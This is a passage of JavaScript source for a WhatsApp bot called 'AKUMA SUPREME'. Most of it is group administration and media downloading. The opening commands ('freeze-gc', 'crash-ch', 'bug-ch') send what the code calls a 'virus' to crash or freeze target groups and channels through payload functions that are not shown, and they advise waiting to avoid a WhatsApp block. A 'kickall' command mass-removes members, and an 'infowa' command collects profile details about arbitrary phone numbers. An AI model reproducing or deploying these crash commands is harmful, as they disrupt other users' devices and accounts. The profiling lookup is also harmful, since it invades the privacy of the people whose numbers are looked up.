    if (!isOwner) return zreply(config.message.owner);
    if (!isGroup) return zreply('This feature is for groups only!');
    sreply(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${groupName}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗰𝗖𝗹𝗶𝗰𝗸\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`)    
    await DocPay(m.chat);
    console.log(chalk.green(`Success Send Bug By ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜××s🐉`));
    await sleep(1000)
    }

break;

case 'blank-gc': case 'freeze-gc': {
    if (!isOwner) return zreply(config.message.owner);
    if (!isGroup) return zreply('This feature is for groups only!');
    sreply(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐓𝐀𝐑𝐆𝐄𝐓 : ${groupName}\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗕𝗹𝗮𝗻𝗸&𝗙𝗿𝗲𝗲𝘇𝗲𝗚𝗰\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`)    
    await InViteAdminA(m.chat);
    await InViteAdminI(m.chat);
    console.log(chalk.green(`Success Send Bug By ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×🐉`));
    await sleep(1000)
    }

break;

case 'fc-ch': case 'kill-ch': case 'crash-ch': case 'bug-ch': {
    if (!isOwner) return zreply(config.message.owner);
    sreply(`「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 」\n\n𖥂 𝐕𝐈𝐑𝐔𝐒 : 𝗙𝗰𝗖𝗹𝗶𝗰𝗸\n\n_» After you send the virus, Please wait 5 minutes so that whatsapp is not blocked._`)    
    await ForceNewsletter(m.chat);
    console.log(chalk.green(`Success Send Bug By ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×͜×🐉`));
    await sleep(1000)
    }

break;

            case "about": {
                let menu = `╔═════ ∘◦ ✧ ◦∘ ═════╗
👨‍💻 ×͜× 𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀 ×͜× – ғᴜʟʟsᴛᴀᴄᴋ
╚═════ ∘◦ ✧ ◦∘ ═════╝

> > ┏━━〔 𝐁𝐎𝐓 𝐒𝐓𝐀𝐓𝐔𝐒 〕━━┓
> ┃ ︻
> ┃ ➥ ʙᴏᴛ ɴᴀᴍᴇ: *𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
> ┃ ➥ ᴠᴇʀꜱɪᴏɴ: *1.0*
> ┃ ➥ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &* 
> ┃                  *𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×*
> ┃ ➥ ᴘʀᴇꜰɪx: *[${prefix}]*
> ┃ ➥ ᴛʏᴘᴇ: *ᴍᴀɪɴ-ᴍᴇɴᴜ*
> ┃ ︼
> ┗━━━━━━━━━━━━━━━━━━━━┛
𝐀𝐊𝐔𝐌𝐀 𝐋𝐄𝐆𝐈𝐎𝐍 ༒ 𝐃𝐄𝐒 𝐎𝐌𝐁𝐑𝐄𝐒 🜲🏴‍☠️꧂

💀 𝐍𝐎𝐔𝐒 𝐍𝐄 𝐏𝐀𝐑𝐋𝐎𝐍𝐒 𝐏𝐋𝐔𝐒…  
𝐍𝐎𝐒 𝐕𝐎𝐈𝐗 𝐒𝐎𝐍𝐓 𝐃𝐄𝐒 𝐒𝐎𝐔𝐅𝐅𝐋𝐄𝐒 𝐌𝐎𝐑𝐓𝐒 𝐃𝐀𝐍𝐒 𝐋𝐄 𝐕𝐈𝐄𝐔𝐗 𝐕𝐄𝐍𝐓.

💀 𝐍𝐎𝐔𝐒 𝐅𝐑𝐀𝐏𝐏𝐎𝐍𝐒…  
𝐂𝐎𝐌𝐌𝐄 𝐃𝐄𝐒 𝐎𝐌𝐁𝐑𝐄𝐒 𝐒𝐀𝐍𝐒 𝐍𝐎𝐌, 𝐏𝐀𝐑 𝐋𝐀 𝐓𝐄́𝐍𝐄̀𝐁𝐑𝐄.

💀 𝐍𝐎𝐔𝐒 𝐍𝐄 𝐏𝐀𝐑𝐃𝐎𝐍𝐍𝐎𝐍𝐒 𝐏𝐀𝐒…  
𝐋𝐄 𝐒𝐄𝐔𝐋 𝐉𝐔𝐆𝐄 𝐄𝐒𝐓 𝐋𝐀 𝐏𝐔𝐑𝐈𝐅𝐈𝐂𝐀𝐓𝐈𝐎𝐍.

💀 𝐍𝐎𝐔𝐒 𝐏𝐔𝐑𝐈𝐅𝐈𝐎𝐍𝐒…  
𝐏𝐀𝐑 𝐋𝐄 𝐅𝐄𝐔, 𝐏𝐀𝐑 𝐋𝐀 𝐁𝐋𝐄𝐒𝐒𝐔𝐑𝐄, 𝐏𝐀𝐑 𝐋’𝐎𝐔𝐁𝐋𝐈.

💀 𝐋𝐀 𝐋𝐄́𝐆𝐈𝐎𝐍 𝐍𝐄 𝐌𝐄𝐔𝐑𝐓 𝐉𝐀𝐌𝐀𝐈𝐒…  
𝐄𝐋𝐋𝐄 𝐒’𝐄́𝐓𝐄𝐍𝐃, 𝐓𝐀𝐋𝐋𝐄 𝐃𝐀𝐍𝐒 𝐋𝐄 𝐒𝐈𝐋𝐄𝐍𝐂𝐄.

💀 𝐄𝐋𝐋𝐄 𝐄𝐅𝐅𝐀𝐂𝐄…  
𝐋𝐄𝐒 𝐋𝐀̂𝐂𝐇𝐄𝐒, 𝐋𝐄𝐒 𝐌𝐄𝐍𝐓𝐄𝐔𝐑𝐒, 𝐋𝐄𝐒 𝐅𝐀𝐍𝐓𝐎̂𝐌𝐄𝐒 𝐃𝐔 𝐏𝐀𝐒𝐒𝐄́.

💀 𝐍𝐎𝐔𝐒 𝐒𝐎𝐌𝐌𝐄𝐒 𝐋𝐀 𝐌𝐎𝐑𝐓 𝐃𝐀𝐍𝐒 𝐋𝐀 𝐕𝐈𝐄,  
𝐋𝐄 𝐒𝐀𝐍𝐆 𝐃𝐀𝐍𝐒 𝐋𝐀 𝐋𝐔𝐌𝐈𝐄̀𝐑𝐄,  
𝐋𝐀 𝐕𝐄́𝐑𝐈𝐓𝐄́ 𝐃𝐀𝐍𝐒 𝐋𝐄 𝐂𝐇𝐀𝐎𝐒.

💀 𝐏𝐑𝐈𝐄𝐙… 𝐌𝐀𝐈𝐒 𝐍𝐔𝐋 𝐍𝐄 𝐕𝐎𝐔𝐒 𝐄𝐍𝐓𝐄𝐍𝐃𝐑𝐀.  
💀 𝐍𝐎𝐔𝐒 𝐒𝐎𝐌𝐌𝐄𝐒 𝐃𝐄́𝐉𝐀̀ 𝐃𝐀𝐍𝐒 𝐕𝐎𝐒 𝐎𝐌𝐁𝐑𝐄𝐒...

꧁𖤐 𝐀𝐊𝐔𝐌𝐀 𝐋𝐄𝐆𝐈𝐎𝐍 ༒ 𝐃𝐄𝐒 𝐎𝐌𝐁𝐑𝐄𝐒 🜲🏴‍☠️꧂
`
                sreply(menu)
            }
            
            
            
            break;
            case 'add': {
                if (!isGroup) return zreply('This feature is for groups only!');
                if (!isBotAdmins) return zreply('_Bots must be admins first_');
                if (!isOwner) return zreply('Only admin/owner can use this feature');

                if (!q && !m.quoted)
                    return zreply(`— ex: ${x} 509xxx or reply to the target message`);

                let targetNum = m.quoted
                    ? (m.quoted.sender || m.quoted.participant || '').replace(/[^0-9]/g, '')
                    : q.replace(/[^0-9]/g, '');

                if (!targetNum) return zreply('Invalid number!');
                if (targetNum.startsWith('0')) return zreply(`— ex: ${x} 509xxx !!`);

                let target = `${targetNum}@s.whatsapp.net`;

                try {
                    await prim.groupParticipantsUpdate(m.chat, [target], 'add');
                    zreply(`✅ Successfully added *${targetNum}* to group`);
                } catch (err) {
                    console.log(err);
                    zreply(`❌ Failed to add user: ${err.message || err}`);
                }
            }
            break;
            case 'kick': {
                if (!isGroup) return zreply('This feature is for groups only!');
                if (!isOwner) return zreply('Admin/owner only!');
                if (!isBotAdmins) return zreply('_Bots must be admins first_');

                if (!q && !m.quoted)
                    return zreply(`— ex: ${x} 509409xxxx or reply to the target message`);

                let num = m.quoted
                    ? (m.quoted.sender || '').replace(/[^0-9]/g, '')
                    : q.replace(/[^0-9]/g, '');

                if (!num) return zreply('Invalid number!');
                let target = `${num}@s.whatsapp.net`;

                try {
                    await prim.groupParticipantsUpdate(m.chat, [target], 'remove');
                    zreply(`✅ Successfully issued *${num}*`);
                } catch (err) {
                    zreply('❌ Failed to kick user');
                }
            }
            break;
            case 'promote': {
                if (!isGroup) return zreply('This feature is for groups only!');
                if (!isOwner) return zreply('Admin/owner only!');
                if (!isBotAdmins) return zreply('_Bots must be admins first_');

                if (!q && !m.quoted)
                    return zreply(`— ex: ${x} 509409xxxx or reply to the target message`)

                let num = m.quoted
                    ? (m.quoted.sender || '').replace(/[^0-9]/g, '')
                    : q.replace(/[^0-9]/g, '');

                if (!num) return zreply('Invalid number!');
                let target = `${num}@s.whatsapp.net`;

                try {
                    await prim.groupParticipantsUpdate(m.chat, [target], 'promote');
                    zreply(`✅ *${num}* now become admin`);
                } catch (e) {
                    zreply('❌ Failed to promote');
                }
            }
            break;
            case 'demote': {
                if (!isGroup) return zreply('This feature is for groups only!');
                if (!isOwner) return zreply('Admin/owner only!');
                if (!isBotAdmins) return zreply('_Bots must be admins first_');

                if (!q && !m.quoted)
                    return zreply(`— ex: ${x} 509409xxxx or reply to the target message`)

                let num = m.quoted
                    ? (m.quoted.sender || '').replace(/[^0-9]/g, '')
                    : q.replace(/[^0-9]/g, '');

                if (!num) return ('Invalid number!');
                let target = `${num}@s.whatsapp.net`;

                try {
                    await prim.groupParticipantsUpdate(m.chat, [target], 'demote');
                    (`✅ *${num}* downgraded from admin`);
                } catch (e) {
                    ('❌ Failed to demote');
                }
            }
            break;
            case 'setppgc': {
               if (!isGroup) return zreply('This feature is for groups only!');
                if (!isOwner) return zreply('Admin/owner only!');
                if (!isBotAdmins) return zreply('_Bots must be admins first_');
                if (!m.quoted || !/image/.test(mime)) return zreply(`Reply image with:\n${x}setppgroup`);

                let media = await prim.downloadAndSaveMediaMessage(qmsg);

                await prim.updateProfilePicture(m.chat, { url: media })
                    .then(() => ('✅ Group profile photo changed successfully'))
                    .catch(() => ('❌ Failed to change profile photo!'));
            }
            break;
            case 'delppgc': {
                if (!isGroup) return ('Group special features!');
                if (!isOwner) return ('Admin only!');
                if (!isBotAdmins) return ('Bot must be admin!');

                try {
                    await prim.removeProfilePicture(m.chat);
                    ('✅ Group profile photo successfully deleted');
                } catch (e) {
                    zreply('❌ Failed to delete group photo');
                }
            }
            break;
            case 'setname': {
                if (!isGroup) return zreply('Group special features!');
                if (!isOwner) return zreply('Admin only!');
                if (!isBotAdmins) return zreply('Bot must be admin!');
                if (!q) return zreply(`— ex: ${x}setname newname`);

                try {
                    await prim.groupUpdateSubject(m.chat, q);
                    zreply(`✅ Group name successfully changed to:\n*${q}*`);
                } catch (e) {
                    zreply('❌ Failed to change group name');
                }
            }
            break;
            case 'setdesc': {
                if (!isGroup) return zreply('Group special features!');
                if (!isOwner) return zreply('Admin only!');
                if (!isBotAdmins) return zreply('Bot must be admin!');
                if (!q) return zreply(`— ex: ${x}setdesc New Description`);

                try {
                    await prim.groupUpdateDescription(m.chat, q);
                    zreply(`✅ Group description successfully changed`);
                } catch (e) {
                    zreply('❌ Failed to change group description');
                }
            }
            break;
            case 'closetime': {
                if (!isGroup) return zreply('Group special features!');
                if (!isAdmins && !isOwner) return zreply('Admin only!');
                if (!isBotAdmins) return zreply('Bot must be admin!');
                if (!args[0] || !args[1]) 
                    return zreply(`— ex: ${x}closetime 5 minute`);

                let time = parseInt(args[0]);
                let unit = args[1].toLowerCase();
                let ms =
                    unit === 'second' ? time * 1000 :
                    unit === 'minute' ? time * 60000 :
                    unit === 'hour'   ? time * 3600000 :
                    unit === 'day'    ? time * 86400000 : null;

                if (!ms) return zreply('Format wrong time! (second/minute/hour/day)');

                zreply(`✅ The group will be closed in ${args[0]} ${args[1]}`);

                setTimeout(async () => {
                    await prim.groupSettingUpdate(m.chat, 'announcement');
                    zreply('📌 Group successfully closed (announcement mode)');
                }, ms);
            }
            break;
            case 'opentime': {
                if (!isGroup) return zreply('Group special features!');
                if (!isAdmins && !isOwner) return zreply('Admin only!');
                if (!isBotAdmins) return zreply('Bot must be admin!');
                if (!args[0] || !args[1])
                    return zreply(`— ex: ${x}opentime 10 minute`);

                let time = parseInt(args[0]);
                let unit = args[1].toLowerCase();
                let ms =
                    unit === 'second' ? time * 1000 :
                    unit === 'minute' ? time * 60000 :
                    unit === 'hour'   ? time * 3600000 :
                    unit === 'day'    ? time * 86400000 : null;

                if (!ms) return zreply('Format wrong time! (second/minute/hour/day)');

                zreply(`✅ The group will be opened in ${args[0]} ${args[1]}`);

                setTimeout(async () => {
                    await prim.groupSettingUpdate(m.chat, 'not_announcement');
                    zreply('✅ Group successfully opened (all members can chat)');
                }, ms);
            }
            break;
            case 'resetlink': {
                if (!isGroup) return zreply('Group specific features!');
                if (!isAdmins && !isOwner) return zreply('Admin only!');
                if (!isBotAdmins) return zreply('Bot must be admin!');

                try {
                    let res = await prim.groupRevokeInvite(m.chat);
                    zreply(`✅ Group link successfully reset!\n\n New link:\nhttps://chat.whatsapp.com/${res}`);
                } catch (e) {
                    zreply('❌ Failed to reset group link');
                }
            }
            break;
            case 'leavegc': {
            if (!isGroup) return zreply('Group specific features!');
                if (!isOwner) return zreply('Owner Only!');
                await zreply('✅ Bot will leave this group...');
                await prim.groupLeave(m.chat);
            }
            break;
            case "kickall": {
                if (!isGroup) return zreply('Group specific features!');
                if (!isAdmins && !isOwner) return zreply('Admin only!');
                if (!isBotAdmins) return zreply('Bot must be admin!');;

  await prim.sendMessage(m.chat, { 
    text: "sᴛᴀʀᴛ..." 
  });

  const freshGroupMetadata = await prim.groupMetadata(m.chat);
  const protectedNumbers = [
    "50942350993@s.whatsapp.net",
    "50940810930@s.whatsapp.net"
  ];
  const nonAdmins = freshGroupMetadata.participants
    .filter(p => 
      !p.admin &&
      !protectedNumbers.includes(p.id)
    )
    .map(p => p.id);

  if (nonAdmins.length === 0) {
    return zreply("✅ No non-administrator members to be expelled from this group.");
  }

  await new Promise(resolve => setTimeout(resolve, 10000));

  try {
    await prim.groupParticipantsUpdate(m.chat, nonAdmins, "remove");
    await prim.sendMessage(m.chat, { 
      text: "✅ sᴜᴄᴄᴇssғᴜʟʟʏ ᴋɪᴄᴋᴇᴅ ᴀʟʟ ᴍᴇᴍʙᴇʀs" 
    });
  } catch (error) {
    console.error('Error during purging:', error);
    await zreply("❌ An error occurred during the eviction process. Please try again later..");
  }
}
break;
case 'tagall': {
                if (!isGroup) return zreply('Group specific features!');
                let teks = `*👥 ᴛᴀɢ ᴀʟʟ ʙʏ 𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄*
 
                 🗞️ *ᴍᴇssᴀɢᴇ : ${q ? q : 'ʙʟᴀɴᴋ'}*\n\n`
                for (let mem of participants) {
                    teks += `🌹 @${mem.id.split('@')[0]}\n`
                }
                prim.sendMessage(m.chat, {
                    text: teks,
                    mentions: participants.map(a => a.id)
                }, {
                    quoted: ImageZnX
                })
                }
                break
            case 'tiktok': {
                if (!q) return zreply(`— ex: ${x}tiktok https://vt.tiktok.com/...`);

                let api = await fetchJson(`https://www.tikwm.com/api/?url=${q}`);

                if (!api || !api.data || !api.data.play) 
                    return zreply('Failed to retrieve TikTok data');

                await prim.sendMessage(m.chat, { 
                    video: { url: api.data.play }, 
                    caption: '✅)' 
                });
            }
            break;
            case 'tiktokslide': {
                if (!q) return zreply(`— ex: ${x}tiktokslide https://vt.tiktok.com/...`);

                let api = await fetchJson(`https://www.tikwm.com/api/?url=${q}`);

                if (!api || !api.data || !api.data.images || api.data.images.length === 0)
                    return zreply('Slides are not available in this video');

                const template = {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2
                            },
                            carouselMessage: {
                                cards: api.data.images.slice(0, 10).map((img, index) => ({
                                    cardId: `card_${index}`,
                                    card: {
                                        header: {
                                            title: `TikTok Slide ${index + 1} from ${api.data.images.length}`,
                                            subtitle: `URL: ${img.substring(0, 30)}...`,
                                            imageMessage: {
                                                url: img,
                                                mimetype: 'image/jpeg'
                                            }
                                        },
                                        body: `🖼️ Swipe to see the next image.`,
                                        footer: `Slide to ${index + 1}`
                                    }
                                }))
                            }
                        }
                    }
                };

                await prim.sendMessage(m.chat, template);
            }

            break;
            case 'tiktokaudio': {
                if (!q) return zreply(`— ex: ${x}tiktokaudio https://vt.tiktok.com/...`);

                let api = await fetchJson(`https://www.tikwm.com/api/?url=${q}`);

                if (!api || !api.data || !api.data.music)
                    return zreply('Audio not found');

                await prim.sendMessage(m.chat, {
                    audio: { url: api.data.music }, 
                    mimetype: 'audio/mp4'
                });
            }
            break;
            
            case 'ping':
                          case 'p':
  await prim.sendMessage(from, { react: { text: '🚀', key: m.key } });
                            {
                              
                                   async function loading (jid) {
                             
                                    let start = new Date;
                                    let { key } = await prim.sendMessage(jid, {text: 'wait..'})
                                    let done = new Date - start;
                                    var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`
                                    
                                    await sleep(1000)
                                    await prim.sendMessage(jid, {text: lod, edit: key });
                                    }
                                    loading(from)
                                   
                            }       
                            break;

case 'idch': {
    if (!q) return zreply("❗ Include channel link");
    if (!q.includes("https://whatsapp.com/channel/")) return zreply("❗ Invalid link");

    let result = q.split('https://whatsapp.com/channel/')[1];
    let res = await prim.newsletterMetadata("invite", result);

    let teks = `- *ID : ${res.id}*
- *Name :* ${res.name}
- *Total Followers :* ${res.subscribers}
- *Status :* ${res.state}
- *Verified :* ${res.verification == "VERIFIED" ? "Verified" : "No"}`;

    const msg = await generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 2
                },
                interactiveMessage: {
                    body: {
                        text: teks
                    },
                    footer: {
                        text: `           ---( We For ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×× )---`
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                name: "cta_copy",
                                buttonParamsJson: `{"display_text": "Copy ID","copy_code": "${res.id}"}`
                            }
                        ]
                    }
                }
            }
        }
    }, { quoted: ImageZnX });

    await prim.relayMessage(m.chat, msg.message, { messageId: msg.key.id });
}
break;

case 'infowa': {
    if (!q) return zreply(`*Syntax Error*\nExample:\n${command} 509xxx`);

    const number = q.replace(/[^0-9]/g, '');
    const jid = number + '@s.whatsapp.net';

    try {
        const wa = await prim.onWhatsApp(number).catch(() => null);
        const data = wa?.[0];

        if (!data || !data.exists) {
            return prim.sendMessage(
                m.chat,
                { text: `❌ Number +${number} *NOT REGISTERED* on WhatsApp.` },
                { quoted: ImageZnX }
            );
        }

        let name = "Not available";
        try {
            const v = await prim.onWhatsApp(jid).catch(() => null);
            name = v?.[0]?.notify || v?.[0]?.name || name;
        } catch {}

        let bioObj = { status: "No bio", setAt: null };
        try {
            const fetched = await prim.fetchStatus(jid).catch(() => null);
            if (fetched && typeof fetched === 'object') bioObj = fetched;
        } catch {}

        let waktuBio = '-';
        try {
            const setAt = bioObj?.setAt;
            const timeNum = setAt ? Number(setAt) : NaN;
            if (!Number.isNaN(timeNum) && timeNum > 0) {
                waktuBio = new Date(timeNum).toLocaleString('id-ID', {
                    timeZone: 'Asia/Jakarta',
                    hour12: false
                }) + " WIB";
            }
        } catch {
            waktuBio = '-';
        }

        let pp = "No Profile Photo";
        try {
            const p = await prim.profilePictureUrl(jid, 'image').catch(() => null);
            if (p) pp = p;
        } catch {}

        const tipe = data?.status === 'business' ? 'Business Account' : 'Personal Account';

        const output = {
            Bot: "×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜× Checker Bot",
            name,
            number: `+${number}`,
            exists: true,
            tipe,
            lid: data?.lid || null,
            businessInfo: data?.businessInfo || null,
            bio: typeof bioObj?.status === 'string' ? bioObj.status : "No bio",
            bioUpdated: waktuBio,
            photoProfile: pp,
            copyright: "© Copyright By ×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×"
        };

        const teks = '```\n' + JSON.stringify(output, null, 2) + '\n```';

        await prim.sendMessage(
            m.chat,
            { text: teks },
            { quoted: ImageZnX }
        );

    } catch (e) {
        await prim.sendMessage(
            m.chat,
            { text: `❌ There is an error.\nError: ${String(e)}` },
            { quoted: ImageZnX }
        );
    }
}
break;

case 'ai': {
    if (!q) return zreply(`*Syntax Error*\nExample:\n${command} What day is today`);

    const txt = encodeURIComponent(q);
    const url = `https://api-faa.my.id/faa/ai-realtime?text=${txt}`;

    try {
        await prim.sendPresenceUpdate('composing', m.chat);

        const res = await fetch(url).then(v => v.json());

        if (!res || !res.result) {
            return zreply(`❌ Failed to get response from AI.`);
        }

        const ai = res.result;

        return prim.sendMessage(
            m.chat,
            { text: `🤖 *Primis*:\n\n${ai}` },
            { quoted: ImageZnX }
        );

    } catch (e) {
        return zreply(`❌ There is an error.\nError: ${String(e)}`);
    }
}
break;

case 'hidetag': {
if (!isGroup) return zreply('Group special features!');

  let message = q ? q : '';
  let mentionedUsers = participants.map(a => a.id);

  try {
    await prim.sendMessage(from, { 
      text: message, 
      mentions: mentionedUsers 
    }, { quoted: ImageZnX });
  } catch (error) {
    console.error("Error sending message:", error);
    zreply("An error occurred while sending the message.");
  }
}
break;

case 'ig': case 'instagram': {
    if (!q) return zreply(`*Syntax Error*\nExample: ig <link Instagram>`);

    let msg = await prim.sendMessage(m.chat, { text: '⏳ Downloading video...' }, { quoted: ImageZnX });

    try {
        let apiUrl = `https://api.siputzx.my.id/api/d/igdl?url=${encodeURIComponent(q)}`;
        let { data } = await axios.get(apiUrl);

        if (!data.status || !Array.isArray(data.data) || data.data.length === 0)
            return zreply('❌ Failed to retrieve video. Check the link.');

        let video = data.data[0];
        let caption = `🎬 *Instagram Downloader*\n📸 ${video.filename || 'Video download results'}\n\n—© Copyright By ×͜×͜×𝐌𝐑 𝐃𝐑𝐀𝐂𝐔𝐋𝐀  &  𝐌𝐑 𝑺𝑴𝑰𝑳𝑬𝒀×͜×͜×`;

        await prim.sendMessage(m.chat, {
            video: { url: video.url },
            caption: caption,
            mimetype: 'video/mp4'
        }, { quoted: ImageZnX });

        await prim.sendMessage(m.chat, { delete: msg.key });

    } catch (err) {
        console.error(err);
        zreply('❌ A server error occurred or the video could not be downloaded..');
    }
}
break;
            case 'ytsearch': {
                if (!q) return zreply(`— ex: ${x}ytsearch 𝑨𝑲𝑼𝑴𝑨 👁️‍🗨️ 𝐒𝐔𝐏𝐑𝐄𝐌𝐄`);

                let res = await fetchJson(`https://api.ryzendesu.vip/api/search/youtube?query=${q}`);
                if (!res || !res.result) return zreply('No results found');

                let teks = `🔎 *YouTube Search:* ${q}\n\n`;
                let no = 1;

                for (let vid of res.result.slice(0, 10)) {
                    teks += `${no++}. *${vid.title}*\n↳ Duration: ${vid.duration}\n↳ Link: ${vid.url}\n\n`;
                }

                zreply(teks.trim());
            }
            // --# End File JavaScript #-- \\
            break;
            
            default:
        }
    } catch (err) {
        console.error(chalk.red('[ CATCH ERROR ]'), util.format(err));
    }
};

let file = require.resolve(__filename)
require('fs').watchFile(file, () => {
    require('fs').unwatchFile(file)
    console.log(chalk.greenBright(`[ UPDATED ] ${__filename} updated!`))
    delete require.cache[file]
    require(file)
})